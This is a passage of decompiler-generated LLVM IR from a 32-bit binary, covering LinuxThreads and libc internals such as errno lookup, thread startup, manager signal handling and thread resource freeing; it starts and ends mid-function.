dec_label_pc_805707d:                             ; preds = %dec_label_pc_8057074
  %v0_805707d = call i32 @__pthread_find_self()
  br label %dec_label_pc_8057082

dec_label_pc_8057082:                             ; preds = %dec_label_pc_8057074, %dec_label_pc_805707d
  %v3_8057082 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_8057082, i32* @edx, align 4
  %v2_8057088 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805708e

dec_label_pc_805708e:                             ; preds = %dec_label_pc_8057067, %entry, %dec_label_pc_8057082
  %v0_805708e = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_8057067 ], [ 134696768, %entry ], [ %v2_8057088, %dec_label_pc_8057082 ]
  ret i32 %v0_805708e

; uselistorder directives
  uselistorder label %dec_label_pc_805708e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057082, { 1, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  %v0_8057092 = call i32 @thread_self()
  %v1_8057097 = add i32 %v0_8057092, 76
  %v2_8057097 = inttoptr i32 %v1_8057097 to i32*
  %v3_8057097 = load i32, i32* %v2_8057097, align 4
  ret i32 %v3_8057097
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80570a1 = call i32 @thread_self()
  %v1_80570a6 = add i32 %v0_80570a1, 68
  %v2_80570a6 = inttoptr i32 %v1_80570a6 to i32*
  %v3_80570a6 = load i32, i32* %v2_80570a6, align 4
  ret i32 %v3_80570a6
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80570b0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80570b8 = load i32, i32* @global_var_8075138.570, align 8
  %v7_80570be = icmp slt i32 %v1_80570b8, %arg1
  br i1 %v7_80570be, label %dec_label_pc_80570c0, label %dec_label_pc_80570f7

dec_label_pc_80570c0:                             ; preds = %entry
  %v1_80570c5 = call i32 @sched_get_priority_max(i32 1)
  %v0_80570cd = load i32, i32* @ebx, align 4
  %v2_80570cd = sub i32 %v0_80570cd, %v1_80570c5
  %v8_80570cd = xor i32 %v0_80570cd, %v1_80570c5
  %v9_80570cd = xor i32 %v2_80570cd, %v0_80570cd
  %v10_80570cd = and i32 %v9_80570cd, %v8_80570cd
  %v11_80570cd = icmp slt i32 %v10_80570cd, 0
  %v13_80570cd = icmp slt i32 %v2_80570cd, 0
  %v2_80570cf = icmp ne i1 %v13_80570cd, %v11_80570cd
  %v3_80570cf = zext i1 %v2_80570cf to i32
  %v2_80570d5 = add i32 %v3_80570cf, %v0_80570cd
  store i32 %v2_80570d5, i32* %stack_var_-8, align 4
  %v2_80570dc = ptrtoint i32* %stack_var_-8 to i32
  %v0_80570e3 = load i32, i32* @global_var_8075134.571, align 4
  %v3_80570e9 = call i32 @sched_setscheduler(i32 %v0_80570e3, i32 1, i32 %v2_80570dc)
  %v0_80570f1 = load i32, i32* @ebx, align 4
  store i32 %v0_80570f1, i32* @global_var_8075138.570, align 8
  br label %dec_label_pc_80570f7

dec_label_pc_80570f7:                             ; preds = %entry, %dec_label_pc_80570c0
  %.0 = phi i32 [ %v3_80570e9, %dec_label_pc_80570c0 ], [ undef, %entry ]
  store i32 %v0_80570b0, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_80570cd, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_80570f7, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %v0_8057104 = load i32, i32* @global_var_8079b00.572, align 256
  %v1_8057109 = icmp eq i32 %v0_8057104, 0
  %v1_805710b = icmp eq i1 %v1_8057109, false
  br i1 %v1_805710b, label %dec_label_pc_8057119.thread, label %dec_label_pc_8057119

dec_label_pc_8057119.thread:                      ; preds = %entry
  store i32 1, i32* @global_var_8079b00.572, align 256
  br label %dec_label_pc_805715d

dec_label_pc_8057119:                             ; preds = %entry
  %v0_805710f = load i32, i32* @global_var_8079b04.573, align 4
  %v1_805710f = icmp eq i32 %v0_805710f, 0
  %v1_8057116 = icmp eq i1 %v1_805710f, false
  %phitmp = icmp eq i1 %v1_8057116, false
  store i32 1, i32* @global_var_8079b00.572, align 256
  br i1 %phitmp, label %dec_label_pc_805715d, label %dec_label_pc_8057127

dec_label_pc_8057127:                             ; preds = %dec_label_pc_8057119
  store i32 0, i32* %stack_var_-148, align 4
  %v2_8057137 = ptrtoint i32* %stack_var_-148 to i32
  br label %dec_label_pc_8057137

dec_label_pc_8057137:                             ; preds = %dec_label_pc_8057153, %dec_label_pc_8057127
  %v0_8057142 = load i32, i32* @global_var_8075304.574, align 4
  store i32 %v0_8057142, i32* %stack_var_-188, align 4
  %v3_8057148 = call i32 @__libc_write(i32 %v0_8057142, i32 %v2_8057137, i32 148)
  %v1_8057150 = add i32 %v3_8057148, 1
  %v8_8057150 = icmp eq i32 %v1_8057150, 0
  %v1_8057151 = icmp eq i1 %v8_8057150, false
  br i1 %v1_8057151, label %dec_label_pc_805715d, label %dec_label_pc_8057153

dec_label_pc_8057153:                             ; preds = %dec_label_pc_8057137
  %v0_8057153 = load i32, i32* %stack_var_-188, align 4
  %v1_8057153 = call i32 @__errno_location(i32 %v0_8057153)
  %v1_8057158 = inttoptr i32 %v1_8057153 to i32*
  %v2_8057158 = load i32, i32* %v1_8057158, align 4
  %v11_8057158 = icmp eq i32 %v2_8057158, 4
  br i1 %v11_8057158, label %dec_label_pc_8057137, label %dec_label_pc_8057153.dec_label_pc_805715d.loopexit_crit_edge

dec_label_pc_8057153.dec_label_pc_805715d.loopexit_crit_edge: ; preds = %dec_label_pc_8057153
  br label %dec_label_pc_805715d

dec_label_pc_805715d:                             ; preds = %dec_label_pc_8057137, %dec_label_pc_8057119.thread, %dec_label_pc_8057153.dec_label_pc_805715d.loopexit_crit_edge, %dec_label_pc_8057119
  %v0_8057163 = phi i32 [ %v0_8057104, %dec_label_pc_8057119 ], [ %v1_8057153, %dec_label_pc_8057153.dec_label_pc_805715d.loopexit_crit_edge ], [ %v0_8057104, %dec_label_pc_8057119.thread ], [ %v1_8057150, %dec_label_pc_8057137 ]
  ret i32 %v0_8057163

; uselistorder directives
  uselistorder i32* %stack_var_-148, { 1, 0 }
  uselistorder label %dec_label_pc_805715d, { 2, 0, 3, 1 }
}

define i32 @pthread_kill_all_threads() local_unnamed_addr {
dec_label_pc_805718c:
  %stack_var_-12 = alloca i32, align 4
  %v0_8057165 = load i32, i32* @edx, align 4
  %v0_8057168 = load i32, i32* @eax, align 4
  %v0_805716a = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  %v0_805716f = load i32, i32* @ebx, align 4
  store i32 %v0_805716f, i32* %stack_var_-12, align 4
  store i32 %v0_805716a, i32* @ebx, align 4
  %v1_805718c = icmp eq i32 %v0_8057165, 0
  br i1 %v1_805718c, label %dec_label_pc_805719e, label %dec_label_pc_8057190

dec_label_pc_8057190:                             ; preds = %dec_label_pc_805718c
  %v1_8057193 = add i32 %v0_805716a, 20
  %v2_8057193 = inttoptr i32 %v1_8057193 to i32*
  %v3_8057193 = load i32, i32* %v2_8057193, align 4
  %v2_8057196 = call i32 @kill(i32 %v3_8057193, i32 %v0_8057168)
  %v2_805719e.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805719e

dec_label_pc_805719e:                             ; preds = %dec_label_pc_805718c, %dec_label_pc_8057190
  %v2_805719e = phi i32 [ %v0_805716f, %dec_label_pc_805718c ], [ %v2_805719e.pre, %dec_label_pc_8057190 ]
  %v0_80571a1 = phi i32 [ %v0_805716a, %dec_label_pc_805718c ], [ %v2_8057196, %dec_label_pc_8057190 ]
  store i32 %v2_805719e, i32* @ebx, align 4
  ret i32 %v0_80571a1

; uselistorder directives
  uselistorder i32 %v0_805716a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805719e, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_80571a2 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80571b0 = call i32 @__libc_getpid(i32 %v0_80571a2)
  %v1_80571b5 = load i32, i32* @ebx, align 4
  %v2_80571b5 = add i32 %v1_80571b5, 20
  %v3_80571b5 = inttoptr i32 %v2_80571b5 to i32*
  store i32 %v1_80571b0, i32* %v3_80571b5, align 4
  %v0_80571bb = load i32, i32* @ebx, align 4
  %v1_80571bb = add i32 %v0_80571bb, 100
  store i32 %v1_80571bb, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v3_80571c1 = inttoptr i32 %v1_80571bb to %_TYPEDEF_sigset_t*
  %v4_80571c1 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80571c1, i32 0)
  store i32 %v4_80571c1, i32* %eax.global-to-local, align 4
  %v0_80571c6 = load i32, i32* @ebx, align 4
  %v1_80571c6 = add i32 %v0_80571c6, 228
  %v2_80571c6 = inttoptr i32 %v1_80571c6 to i32*
  %v3_80571c6 = load i32, i32* %v2_80571c6, align 4
  %v2_80571cf = icmp slt i32 %v3_80571c6, 0
  br i1 %v2_80571cf, label %dec_label_pc_80571de, label %dec_label_pc_80571d3

dec_label_pc_80571d3:                             ; preds = %entry
  %v1_80571d4 = add i32 %v0_80571c6, 232
  br label %dec_label_pc_80571fd

dec_label_pc_80571de:                             ; preds = %entry
  %v0_80571de = load i32, i32* @global_var_8075138.570, align 8
  %tmp16 = icmp slt i32 %v0_80571de, 1
  br i1 %tmp16, label %dec_label_pc_8057208, label %dec_label_pc_80571e7

dec_label_pc_80571e7:                             ; preds = %dec_label_pc_80571de
  store i32 0, i32* %stack_var_-8, align 4
  %v2_80571f3 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_80571fd

dec_label_pc_80571fd:                             ; preds = %dec_label_pc_80571d3, %dec_label_pc_80571e7
  %storemerge2 = phi i32 [ %v1_80571d4, %dec_label_pc_80571d3 ], [ %v2_80571f3, %dec_label_pc_80571e7 ]
  %storemerge1 = phi i32 [ %v3_80571c6, %dec_label_pc_80571d3 ], [ 0, %dec_label_pc_80571e7 ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_80571fd = add i32 %v0_80571c6, 20
  %v2_80571fd = inttoptr i32 %v1_80571fd to i32*
  %v3_80571fd = load i32, i32* %v2_80571fd, align 4
  store i32 %v3_80571fd, i32* %stack_var_-188, align 4
  %v3_8057200 = call i32 @sched_setscheduler(i32 %v3_80571fd, i32 %storemerge1, i32 %storemerge2)
  store i32 %v3_8057200, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057208

dec_label_pc_8057208:                             ; preds = %dec_label_pc_80571de, %dec_label_pc_80571fd
  %v0_8057208 = load i32, i32* @global_var_807f368.576, align 8
  store i32 %v0_8057208, i32* %eax.global-to-local, align 4
  %v1_805720d = icmp eq i32 %v0_8057208, 0
  br i1 %v1_805720d, label %dec_label_pc_8057258, label %dec_label_pc_8057211

dec_label_pc_8057211:                             ; preds = %dec_label_pc_8057208
  %v0_8057211 = load i32, i32* @global_var_8075310.577, align 16
  %tmp17 = icmp slt i32 %v0_8057211, 1
  br i1 %tmp17, label %dec_label_pc_8057258, label %dec_label_pc_805721a

dec_label_pc_805721a:                             ; preds = %dec_label_pc_8057211
  %v0_805721a = load i32, i32* @ebx, align 4
  store i32 %v0_805721a, i32* %stack_var_-156, align 4
  %v2_8057226 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_8057226

dec_label_pc_8057226:                             ; preds = %dec_label_pc_8057242, %dec_label_pc_805721a
  store i32 %v2_8057226, i32* %eax.global-to-local, align 4
  %v0_8057231 = load i32, i32* @global_var_8075304.574, align 4
  store i32 %v0_8057231, i32* %stack_var_-188, align 4
  %v3_8057237 = call i32 @__libc_write(i32 %v0_8057231, i32 %v2_8057226, i32 148)
  %v1_805723f = add i32 %v3_8057237, 1
  %v8_805723f = icmp eq i32 %v1_805723f, 0
  store i32 %v1_805723f, i32* %eax.global-to-local, align 4
  %v1_8057240 = icmp eq i1 %v8_805723f, false
  br i1 %v1_8057240, label %dec_label_pc_805724c, label %dec_label_pc_8057242

dec_label_pc_8057242:                             ; preds = %dec_label_pc_8057226
  %v0_8057242 = load i32, i32* %stack_var_-188, align 4
  %v1_8057242 = call i32 @__errno_location(i32 %v0_8057242)
  store i32 %v1_8057242, i32* %eax.global-to-local, align 4
  %v1_8057247 = inttoptr i32 %v1_8057242 to i32*
  %v2_8057247 = load i32, i32* %v1_8057247, align 4
  %v11_8057247 = icmp eq i32 %v2_8057247, 4
  br i1 %v11_8057247, label %dec_label_pc_8057226, label %dec_label_pc_8057242.dec_label_pc_805724c_crit_edge

dec_label_pc_8057242.dec_label_pc_805724c_crit_edge: ; preds = %dec_label_pc_8057242
  br label %dec_label_pc_805724c

dec_label_pc_805724c:                             ; preds = %dec_label_pc_8057226, %dec_label_pc_8057242.dec_label_pc_805724c_crit_edge
  %v0_805724f = load i32, i32* @ebx, align 4
  store i32 %v0_805724f, i32* %stack_var_-188, align 4
  %v1_8057250 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_805724f)
  store i32 %v1_8057250, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057258

dec_label_pc_8057258:                             ; preds = %dec_label_pc_8057211, %dec_label_pc_8057208, %dec_label_pc_805724c
  %v0_805725b = load i32, i32* @ebx, align 4
  %v1_805725b = add i32 %v0_805725b, 96
  %v2_805725b = inttoptr i32 %v1_805725b to i32*
  %v3_805725b = load i32, i32* %v2_805725b, align 4
  store i32 %v3_805725b, i32* %stack_var_-188, align 4
  %v5_805725e = add i32 %v0_805725b, 92
  %v6_805725e = inttoptr i32 %v5_805725e to i32*
  %v7_805725e = load i32, i32* %v6_805725e, align 4
  call void @__pseudo_call(i32 %v7_805725e)
  store i32 %v3_805725b, i32* @ecx, align 4
  %v2_8057263 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8057263, i32* %stack_var_-188, align 4
  %v0_805726b = load i32, i32* %eax.global-to-local, align 4
  %v2_805726c = call i32 @__pthread_do_exit(i32 %v0_805726b, i32 %v2_8057263)
  store i32 %v2_805726c, i32* %eax.global-to-local, align 4
  ret i32 %v2_805726c

; uselistorder directives
  uselistorder i32 %v3_80571c6, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 5, 1, 3, 2, 4, 6, 7, 10, 8, 9 }
  uselistorder label %dec_label_pc_8057258, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805724c, { 1, 0 }
  uselistorder label %dec_label_pc_8057208, { 1, 0 }
  uselistorder label %dec_label_pc_80571fd, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8057271 = load i32, i32* @ebx, align 4
  store i32 %v0_8057271, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8057279 = call i32 @__libc_getpid(i32 %v0_8057271)
  store i32 0, i32* @edx, align 4
  %v1_8057280 = load i32, i32* @ebx, align 4
  %v2_8057280 = add i32 %v1_8057280, 20
  %v3_8057280 = inttoptr i32 %v2_8057280 to i32*
  store i32 %v1_8057279, i32* %v3_8057280, align 4
  %v0_8057283 = load i32, i32* @ebx, align 4
  %v1_8057283 = add i32 %v0_8057283, 28
  %v2_8057283 = inttoptr i32 %v1_8057283 to i32*
  %v3_8057283 = load i32, i32* %v2_8057283, align 4
  store i32 %v3_8057283, i32* @eax, align 4
  %v0_8057286 = load i32, i32* %stack_var_-4, align 4
  %v1_8057286 = call i32 @__pthread_lock(i32 %v0_8057286)
  %v0_805728e = load i32, i32* @ebx, align 4
  %v1_805728e = add i32 %v0_805728e, 28
  %v2_805728e = inttoptr i32 %v1_805728e to i32*
  %v3_805728e = load i32, i32* %v2_805728e, align 4
  %v1_8057291 = inttoptr i32 %v3_805728e to i32*
  %v2_8057291 = call i32 @__pthread_unlock(i32* %v1_8057291)
  %v0_8057296 = load i32, i32* @ebx, align 4
  %v1_8057299 = call i32 @pthread_start_thread(i32 %v0_8057296)
  ret i32 %v1_8057299
}

define i32 @pthread_free() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805729e = load i32, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v0_80572a1 = load i32, i32* @ebx, align 4
  %v0_80572a2 = load i32, i32* @eax, align 4
  store i32 %v0_80572a2, i32* @esi, align 4
  %v1_80572a7 = add i32 %v0_80572a2, 16
  %v2_80572a7 = inttoptr i32 %v1_80572a7 to i32*
  %v3_80572a7 = load i32, i32* %v2_80572a7, align 4
  %v1_80572aa = mul i32 %v3_80572a7, 16
  %v2_80572b0 = and i32 %v1_80572aa, 16368
  %v1_80572b3 = add i32 %v2_80572b0, ptrtoint (i32* @global_var_8070f20.578 to i32)
  store i32 %v1_80572b3, i32* @ebx, align 4
  store i32 %v1_80572b3, i32* @eax, align 4
  %v1_80572bb = call i32 @__pthread_lock(i32 %v0_80572a1)
  %v0_80572c3 = load i32, i32* @ebx, align 4
  %v1_80572c3 = add i32 %v0_80572c3, 8
  %v2_80572c3 = inttoptr i32 %v1_80572c3 to i32*
  store i32 0, i32* %v2_80572c3, align 4
  %v0_80572ca = load i32, i32* @ebx, align 4
  %v1_80572ca = add i32 %v0_80572ca, 12
  %v2_80572ca = inttoptr i32 %v1_80572ca to i32*
  store i32 -1, i32* %v2_80572ca, align 4
  %v0_80572d1 = load i32, i32* @ebx, align 4
  %v1_80572d2 = inttoptr i32 %v0_80572d1 to i32*
  %v2_80572d2 = call i32 @__pthread_unlock(i32* %v1_80572d2)
  %v0_80572d7 = load i32, i32* @global_var_8074f20.579, align 32
  %v1_80572dc = add i32 %v0_80572d7, -1
  store i32 %v1_80572dc, i32* @global_var_8074f20.579, align 32
  %v0_80572e2 = load i32, i32* @esi, align 4
  %v1_80572e2 = add i32 %v0_80572e2, 448
  %v2_80572e2 = inttoptr i32 %v1_80572e2 to i32*
  %storemerge24 = load i32, i32* %v2_80572e2, align 4
  %v1_80572fa25 = icmp eq i32 %storemerge24, 0
  %v1_80572fc27 = icmp eq i1 %v1_80572fa25, false
  br i1 %v1_80572fc27, label %dec_label_pc_80572ea.lr.ph, label %dec_label_pc_80572fe

dec_label_pc_80572ea.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80572ea

dec_label_pc_80572ea:                             ; preds = %dec_label_pc_80572ea.lr.ph, %dec_label_pc_80572ea
  %storemerge28 = phi i32 [ %storemerge24, %dec_label_pc_80572ea.lr.ph ], [ %storemerge, %dec_label_pc_80572ea ]
  %v1_80572ea = inttoptr i32 %storemerge28 to i32*
  %v2_80572ea = load i32, i32* %v1_80572ea, align 4
  store i32 %v2_80572ea, i32* @ebx, align 4
  %v1_80572f0 = call i32 @free(i32 %storemerge28)
  %storemerge = load i32, i32* @ebx, align 4
  %v1_80572fa = icmp eq i32 %storemerge, 0
  %v1_80572fc = icmp eq i1 %v1_80572fa, false
  br i1 %v1_80572fc, label %dec_label_pc_80572ea, label %dec_label_pc_80572f7.dec_label_pc_80572fe_crit_edge

dec_label_pc_80572f7.dec_label_pc_80572fe_crit_edge: ; preds = %dec_label_pc_80572ea
  %v0_80572fe.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80572fe

dec_label_pc_80572fe:                             ; preds = %dec_label_pc_80572f7.dec_label_pc_80572fe_crit_edge, %entry
  %v0_80572fe = phi i32 [ %v0_80572fe.pre, %dec_label_pc_80572f7.dec_label_pc_80572fe_crit_edge ], [ %v0_80572e2, %entry ]
  %v1_80572fe = add i32 %v0_80572fe, 452
  %v2_80572fe = inttoptr i32 %v1_80572fe to i32*
  %storemerge23 = load i32, i32* %v2_80572fe, align 4
  %v1_80573164 = icmp eq i32 %storemerge23, 0
  %v1_805731811 = icmp eq i1 %v1_80573164, false
  br i1 %v1_805731811, label %dec_label_pc_8057306.preheader, label %dec_label_pc_805731a

dec_label_pc_8057306.preheader:                   ; preds = %dec_label_pc_80572fe
  br label %dec_label_pc_8057306

dec_label_pc_8057306:                             ; preds = %dec_label_pc_8057306.preheader, %dec_label_pc_8057306
  %v0_805730b = phi i32 [ %storemerge2, %dec_label_pc_8057306 ], [ %storemerge23, %dec_label_pc_8057306.preheader ]
  %v1_8057306 = inttoptr i32 %v0_805730b to i32*
  %v2_8057306 = load i32, i32* %v1_8057306, align 4
  store i32 %v2_8057306, i32* @ebx, align 4
  %v1_805730c = call i32 @free(i32 %v0_805730b)
  %storemerge2 = load i32, i32* @ebx, align 4
  %v1_8057316 = icmp eq i32 %storemerge2, 0
  %v1_8057318 = icmp eq i1 %v1_8057316, false
  br i1 %v1_8057318, label %dec_label_pc_8057306, label %dec_label_pc_8057316.dec_label_pc_805731a_crit_edge

dec_label_pc_8057316.dec_label_pc_805731a_crit_edge: ; preds = %dec_label_pc_8057306
  %v0_805731a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805731a

dec_label_pc_805731a:                             ; preds = %dec_label_pc_8057316.dec_label_pc_805731a_crit_edge, %dec_label_pc_80572fe
  %v0_8057338 = phi i32 [ %v0_805731a.pre, %dec_label_pc_8057316.dec_label_pc_805731a_crit_edge ], [ %v0_80572fe, %dec_label_pc_80572fe ]
  %v6_805731a = icmp eq i32 %v0_8057338, 134696768
  br i1 %v6_805731a, label %dec_label_pc_805735c, label %dec_label_pc_8057322

dec_label_pc_8057322:                             ; preds = %dec_label_pc_805731a
  %v1_8057322 = add i32 %v0_8057338, 392
  %v2_8057322 = inttoptr i32 %v1_8057322 to i32*
  %v3_8057322 = load i32, i32* %v2_8057322, align 4
  %v4_8057322 = icmp eq i32 %v3_8057322, 0
  %v1_8057329 = icmp eq i1 %v4_8057322, false
  br i1 %v1_8057329, label %dec_label_pc_805735c, label %dec_label_pc_805732b

dec_label_pc_805732b:                             ; preds = %dec_label_pc_8057322
  %v1_805732b = add i32 %v0_8057338, 400
  %v2_805732b = inttoptr i32 %v1_805732b to i32*
  %v3_805732b = load i32, i32* %v2_805732b, align 4
  %v1_8057331 = icmp eq i32 %v3_805732b, 0
  br i1 %v1_8057331, label %dec_label_pc_8057346, label %dec_label_pc_8057335

dec_label_pc_8057335:                             ; preds = %dec_label_pc_805732b
  %v0_8057335 = load i32, i32* @edx, align 4
  %v1_8057338 = add i32 %v0_8057338, 396
  %v2_8057338 = inttoptr i32 %v1_8057338 to i32*
  %v3_8057338 = load i32, i32* %v2_8057338, align 4
  %v4_805733e = call i32 @munmap(i32 %v3_8057338, i32 %v3_805732b, i32 %v0_8057335, i32 %v0_8057335)
  %v0_805734d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057346

dec_label_pc_8057346:                             ; preds = %dec_label_pc_805732b, %dec_label_pc_8057335
  %v0_805734d = phi i32 [ %v0_805734d.pre, %dec_label_pc_8057335 ], [ %v0_8057338, %dec_label_pc_805732b ]
  %v0_8057346 = phi i32 [ %v4_805733e, %dec_label_pc_8057335 ], [ 0, %dec_label_pc_805732b ]
  %v1_805734d = add i32 %v0_805734d, -2096672
  %v4_8057354 = call i32 @munmap(i32 %v1_805734d, i32 2097152, i32 %v0_8057346, i32 %v0_8057346)
  br label %dec_label_pc_805735c

dec_label_pc_805735c:                             ; preds = %dec_label_pc_8057322, %dec_label_pc_805731a, %dec_label_pc_8057346
  %v2_805735c = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80572a1, i32* @ebx, align 4
  store i32 %v0_805729e, i32* @esi, align 4
  ret i32 %v2_805735c

; uselistorder directives
  uselistorder i32 %v0_8057338, { 1, 2, 3, 4, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v0_80572fe, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %storemerge28, { 1, 0 }
  uselistorder label %dec_label_pc_805735c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057346, { 1, 0 }
  uselistorder label %dec_label_pc_8057306, { 1, 0 }
  uselistorder label %dec_label_pc_80572ea, { 1, 0 }
}

define i32 @restart() local_unnamed_addr {
entry:
  %v0_8057363 = load i32, i32* @eax, align 4
  %v1_8057364 = call i32 @__pthread_restart_new(i32 %v0_8057363)
  ret i32 %v1_8057364
}

define i32 @pthread_reap_children() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805736d = load i32, i32* @esi, align 4
  %v0_805736e = load i32, i32* @ebx, align 4
  store i32 %v0_805736e, i32* %stack_var_-8, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8057444 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_805743e

dec_label_pc_8057377:                             ; preds = %dec_label_pc_805743e
  %v0_8057377 = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  br label %dec_label_pc_80573f6

dec_label_pc_8057381:                             ; preds = %dec_label_pc_80573f6
  %v1_8057381 = add i32 %v0_8057388, 20
  %v2_8057381 = inttoptr i32 %v1_8057381 to i32*
  %v3_8057381 = load i32, i32* %v2_8057381, align 4
  %v15_8057381 = icmp eq i32 %v3_8057381, %v3_805744b
  %v1_8057384 = inttoptr i32 %v0_8057388 to i32*
  %v2_8057384 = load i32, i32* %v1_8057384, align 4
  store i32 %v2_8057384, i32* %edx.global-to-local, align 4
  %v1_8057386 = icmp eq i1 %v15_8057381, false
  br i1 %v1_8057386, label %dec_label_pc_80573f6, label %dec_label_pc_8057388

dec_label_pc_8057388:                             ; preds = %dec_label_pc_8057381
  %v1_8057388 = add i32 %v0_8057388, 4
  %v2_8057388 = inttoptr i32 %v1_8057388 to i32*
  %v3_8057388 = load i32, i32* %v2_8057388, align 4
  %v2_805738b = add i32 %v2_8057384, 4
  %v3_805738b = inttoptr i32 %v2_805738b to i32*
  store i32 %v3_8057388, i32* %v3_805738b, align 4
  %v0_805738e = load i32, i32* @esi, align 4
  %v1_805738e = add i32 %v0_805738e, 4
  %v2_805738e = inttoptr i32 %v1_805738e to i32*
  %v3_805738e = load i32, i32* %v2_805738e, align 4
  %v0_8057391 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057391 = inttoptr i32 %v3_805738e to i32*
  store i32 %v0_8057391, i32* %v2_8057391, align 4
  %v0_8057393 = load i32, i32* @esi, align 4
  %v1_8057393 = add i32 %v0_8057393, 28
  %v2_8057393 = inttoptr i32 %v1_8057393 to i32*
  %v3_8057393 = load i32, i32* %v2_8057393, align 4
  store i32 %v3_8057393, i32* @eax, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v0_8057398 = load i32, i32* %stack_var_-8, align 4
  %v1_8057398 = call i32 @__pthread_lock(i32 %v0_8057398)
  %v0_805739d = load i32, i32* @esi, align 4
  %v1_805739d = add i32 %v0_805739d, 412
  %v2_805739d = inttoptr i32 %v1_805739d to i32*
  %v3_805739d = load i32, i32* %v2_805739d, align 4
  %v4_805739d = icmp eq i32 %v3_805739d, 0
  store i1 %v4_805739d, i1* %zf.global-to-local, align 1
  %v1_80573a4 = add i32 %v0_805739d, 46
  %v2_80573a4 = inttoptr i32 %v1_80573a4 to i8*
  store i8 1, i8* %v2_80573a4, align 1
  %v0_80573a8 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80573a8, label %dec_label_pc_80573d5, label %dec_label_pc_80573aa

dec_label_pc_80573aa:                             ; preds = %dec_label_pc_8057388
  %v0_80573aa = load i32, i32* @global_var_807f35c.580, align 4
  %v1_80573af = load i32, i32* @esi, align 4
  %v2_80573af = add i32 %v1_80573af, 416
  %v3_80573af = inttoptr i32 %v2_80573af to i32*
  %v4_80573af = load i32, i32* %v3_80573af, align 4
  %v5_80573af = or i32 %v4_80573af, %v0_80573aa
  store i32 %v5_80573af, i32* @eax, align 4
  %v3_80573b5 = and i32 %v5_80573af, 2048
  %v4_80573b5 = icmp eq i32 %v3_80573b5, 0
  store i1 %v4_80573b5, i1* %zf.global-to-local, align 1
  br i1 %v4_80573b5, label %dec_label_pc_80573d5, label %dec_label_pc_80573ba

dec_label_pc_80573ba:                             ; preds = %dec_label_pc_80573aa
  %v1_80573ba = add i32 %v1_80573af, 424
  %v2_80573ba = inttoptr i32 %v1_80573ba to i32*
  store i32 12, i32* %v2_80573ba, align 4
  %v0_80573c4 = load i32, i32* @esi, align 4
  %v2_80573c4 = add i32 %v0_80573c4, 428
  %v3_80573c4 = inttoptr i32 %v2_80573c4 to i32*
  store i32 %v0_80573c4, i32* %v3_80573c4, align 4
  %v0_80573ca = load i32, i32* @esi, align 4
  store i32 %v0_80573ca, i32* @global_var_807f364.581, align 4
  %v0_80573d0 = call i32 @__linuxthreads_reap_event()
  br label %dec_label_pc_80573d5

dec_label_pc_80573d5:                             ; preds = %dec_label_pc_80573aa, %dec_label_pc_8057388, %dec_label_pc_80573ba
  %v0_80573d5 = load i32, i32* @esp, align 4
